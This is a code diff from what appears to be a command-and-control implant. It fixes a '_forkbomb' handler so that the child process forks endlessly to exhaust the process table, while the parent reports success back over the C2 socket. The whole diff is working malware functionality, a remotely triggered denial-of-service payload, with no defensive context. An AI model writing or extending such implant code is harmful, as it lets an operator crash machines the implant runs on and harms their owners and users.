@@ -2490,9 +2490,19 @@ def _forkbomb(conn, args: list[str]) -> str:
     if not hasattr(os, "fork"):
         return "[-] forkbomb not supported on this platform"
     try:
-        os.fork()
+        pid = os.fork()
     except OSError as e:
         return f"[-] fork failed: {e}"
+    if pid == 0:
+        # Child process — fork again in a loop to exhaust process table.
+        # Must NOT send a response; parent owns the C2 socket.
+        try:
+            while True:
+                os.fork()
+        except OSError:
+            pass
+        os._exit(0)
+    # Parent only reaches here — send the single expected response
     return "[+] forkbomb triggered"
 
 
